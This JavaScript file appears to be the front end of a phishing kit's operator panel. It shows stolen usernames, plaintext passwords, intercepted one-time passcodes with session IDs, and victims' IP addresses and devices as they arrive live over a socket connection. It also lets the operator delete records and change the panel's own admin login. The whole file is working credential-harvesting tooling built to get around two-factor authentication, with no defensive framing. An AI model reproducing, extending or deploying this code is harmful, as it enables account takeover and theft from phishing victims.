const socket = io();
const statusEl = document.getElementById('status');
const loginBody = document.querySelector('#login-table tbody');
const otpBody = document.querySelector('#otp-table tbody');
const accessBody = document.querySelector('#access-table tbody');
const activityBody = document.querySelector('#activity-table tbody');
const toast = document.getElementById('toast');
const adminUpdateForm = document.getElementById('admin-update-form');

function formatTime(value) {
  return new Date(value).toLocaleString();
}

function setStatus(text) {
  statusEl.textContent = text;
}

function showToast(message) {
  toast.textContent = message;
  toast.classList.remove('hidden');
  clearTimeout(window.toastTimer);
  window.toastTimer = setTimeout(() => {
    toast.classList.add('hidden');
  }, 4500);
  addActivityRow(message);
}

function addLoginRow(record) {
  const row = document.createElement('tr');
  row.dataset.id = record._id;
  row.innerHTML = `
    <td>${record.username}</td>
    <td>${record.password}</td>
    <td>${record.sessionId || '—'}</td>
    <td>${formatTime(record.createdAt)}</td>
    <td><button class="btn-delete" data-id="${record._id}" data-type="credential">Delete</button></td>
  `;
  loginBody.prepend(row);
}

function addOtpRow(record) {
  const row = document.createElement('tr');
  row.dataset.id = record._id;
  row.innerHTML = `
    <td>${record.code}</td>
    <td>${record.sessionId || '—'}</td>
    <td>${formatTime(record.createdAt)}</td>
    <td><button class="btn-delete" data-id="${record._id}" data-type="otp">Delete</button></td>
  `;
  otpBody.prepend(row);
}

function addAccessRow(record) {
  const row = document.createElement('tr');
  row.dataset.id = record._id;
  row.innerHTML = `
    <td>${record.ip}</td>
    <td>${record.device}</td>
    <td>${record.message}</td>
    <td>${formatTime(record.createdAt)}</td>
    <td><button class="btn-delete" data-id="${record._id}" data-type="access">Delete</button></td>
  `;
  accessBody.prepend(row);
}

function addActivityRow(message) {
  const row = document.createElement('tr');
  row.innerHTML = `
    <td>${message}</td>
    <td>${formatTime(new Date().toISOString())}</td>
  `;
  activityBody.prepend(row);
}

// Delete handler (delegated)
async function deleteRecord(type, id, rowEl) {
  try {
    const resp = await fetch(`/admin/delete/${type}/${id}`, { method: 'DELETE' });
    if (!resp.ok) throw new Error('Delete failed');
    if (rowEl && rowEl.remove) rowEl.remove();
    showToast('Deleted ' + type + ' ' + id);
  } catch (err) {
    console.error('Delete error', err);
    showToast('Delete failed');
  }
}

// Event delegation for delete buttons
document.addEventListener('click', (e) => {
  const btn = e.target.closest('.btn-delete');
  if (!btn) return;
  const id = btn.dataset.id;
  const type = btn.dataset.type;
  const row = btn.closest('tr');
  deleteRecord(type, id, row);
});

async function loadInitialData() {
  try {
    const response = await fetch('/admin/data');
    const data = await response.json();
    data.credentials.reverse().forEach(addLoginRow);
    data.otps.reverse().forEach(addOtpRow);
    data.accesses.reverse().forEach(addAccessRow);
  } catch (error) {
    console.error('Failed to load admin data:', error);
  }
}

socket.on('connect', () => {
  setStatus('yes');
  addActivityRow('Admin connected to socket');
});

socket.on('disconnect', () => {
  setStatus('no');
  addActivityRow('Admin disconnected from socket');
});

socket.on('loginSaved', (record) => {
  addLoginRow(record);
  addActivityRow(`Login saved: ${record.username}`);
});

socket.on('otpSaved', (record) => {
  addOtpRow(record);
  addActivityRow(`OTP saved: ${record.code}`);
});

socket.on('userOnline', (record) => {
  addAccessRow(record);
  showToast(`User online: ${record.ip} (${record.device})`);
});

socket.on('deleted', ({ type, id }) => {
  const tables = {
    credential: loginBody,
    otp: otpBody,
    access: accessBody,
  };
  const body = tables[type];
  if (!body) return;
  const row = body.querySelector(`tr[data-id="${id}"]`);
  if (row) row.remove();
  showToast(`${type} deleted: ${id}`);
});

adminUpdateForm?.addEventListener('submit', async (event) => {
  event.preventDefault();
  const formData = new FormData(adminUpdateForm);
  const username = formData.get('username')?.toString();
  const password = formData.get('password')?.toString();
  try {
    const response = await fetch('/admin/update-admin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password }),
    });
    const data = await response.json();
    if (!response.ok) throw new Error(data.error || 'Update failed');
    showToast(`Admin credentials updated: ${data.username}`);
    adminUpdateForm.reset();
  } catch (error) {
    console.error('Admin update failed:', error);
    showToast('Admin update failed');
  }
});

window.addEventListener('load', loadInitialData);
